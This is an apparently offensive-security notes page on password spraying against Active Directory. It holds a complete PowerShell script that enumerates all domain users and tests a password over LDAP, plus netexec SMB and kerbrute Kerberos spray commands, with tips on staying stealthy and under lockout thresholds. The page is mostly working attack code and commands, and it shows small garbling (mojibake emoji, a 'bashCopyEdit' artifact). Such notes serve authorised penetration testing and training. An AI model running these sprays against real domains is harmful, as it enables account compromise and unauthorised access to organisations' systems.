---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Passwords

Before attempting any password attacks, check the domain's **account lockout policy** to avoid locking out accounts or triggering alerts.

```powershell
# List the account policy
> net accounts
...
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
...
```

Based on the above policy, we can safely try **4 login attempts per user every 30 minutes**. This allows up to **192 attempts/user/day**.

> _Tools like_ [_`netexec`_](../../../tools/active-directory/netexec-cme.md#password-policy) _can be used to enumerate the domain's account lockout policy._

## Password Spraying

### LDAP-Based

This method leverages LDAP binding via PowerShell‚Äôs `.NET` libraries. It attempts authentication by trying to create an LDAP object ‚Äî if it succeeds, the credentials are valid. This method is **stealthy**, no interactive log in, and **respects lockout policy**, but is **slow** and **limited to one password per run**.

{% code overflow="wrap" %}
```powershell
# Get the domain and PDC
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domain.PdcRoleOwner.Name
# Construct the LDAP path
$ldap = "LDAP://$PDC/DC=" + $domain.Name.Replace('.', ',DC=')
# Attempt authentication
$entry = New-Object System.DirectoryServices.DirectoryEntry($ldap, "pete", "Nexus123!")
$entry.distinguishedName  # Triggers authentication
```
{% endcode %}

If the password is invalid, it throws an error. If valid, it returns the DN. We can automate this with the following script which loops through AD users and reports valid logins.

{% code title="LDAPSpray.ps1" overflow="wrap" %}
```powershell
param(
    [string]$Password = "Nexus123!",
    [string]$Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
)

Write-Host "[*] Starting LDAP password spray for domain: $Domain"
$PDC = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner).Name
$LDAP = "LDAP://$PDC/DC=" + $Domain.Replace('.', ',DC=')

# Get all users from AD
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(objectCategory=person)"
$Searcher.PageSize = 1000
$Searcher.PropertiesToLoad.Add("sAMAccountName") > $null
$Users = $Searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

foreach ($User in $Users) {
    if ([string]::IsNullOrWhiteSpace($User)) { continue }

    try {
        $Entry = New-Object System.DirectoryServices.DirectoryEntry($LDAP, $User, $Password)
        $null = $Entry.distinguishedName  # Force bind/authentication
        Write-Host "[+] VALID: $User : $Password"
    } catch {
        Write-Host "[-] INVALID: $User"
    }
}

```
{% endcode %}

```powershell
> .\LDAPSpray.ps1 -Password "Nexus123!"
```

### SMB-Based

This method involves a full SMB session setup/teardown on each authentication attempt so it's **slow**, **noisy**, and **does not respect the lockout policy**. We can perform this attack using tools like [`netexec`](../../../tools/active-directory/netexec-cme.md#password-spray).

> _With `netxec`, if a sprayed password is valid_ _and the user is a `local administrator` on the target system, the `(Pwn3d!)` string will appear. This means that tools like `psexec`, `wmiexec`, or `secretsdump` can be used for lateral movement or privilege escalation._

{% code overflow="wrap" %}
```bash
$ nxc smb 192.168.177.0/24 -u pete -p 'Nexus123!' -d corp.com --continue-on-success
```
{% endcode %}

**Tips:**

* Use `--shares` or `--sessions` for post-auth enumeration.
* Use `--local-auth` if targeting local accounts.
* Log everything: `--output results.txt`.

### &#x20;Kerberos-Based

Uses Kerberos AS-REQs to test credentials. It's lightweight and fast ‚Äî only 2 packets per attempt (UDP/88), making it ideal for stealth.

‚úÖ _Extremely fast and quiet_\
‚ùå _Doesn‚Äôt respect lockout policies (but low risk)_

```bash
bashCopyEditkerbrute passwordspray -d corp.com usernames.txt "Nexus123!"
```

Valid logins return a TGT (AS-REP); invalid ones return a fast error. Use ANSI encoding in your input files to avoid weird issues.

***

#### üîç Summary Comparison

| Protocol | Noise | Lockout-Safe | Speed     | Notes                              |
| -------- | ----- | ------------ | --------- | ---------------------------------- |
| LDAP     | Low   | ‚úÖ Yes        | Medium    | Scriptable, stealthy               |
| SMB      | High  | ‚ùå No         | Slow      | Reveals admin access (`Pwn3d!`)    |
| Kerberos | Low   | ‚ùå No         | Very Fast | UDP-based, great for fast spraying |
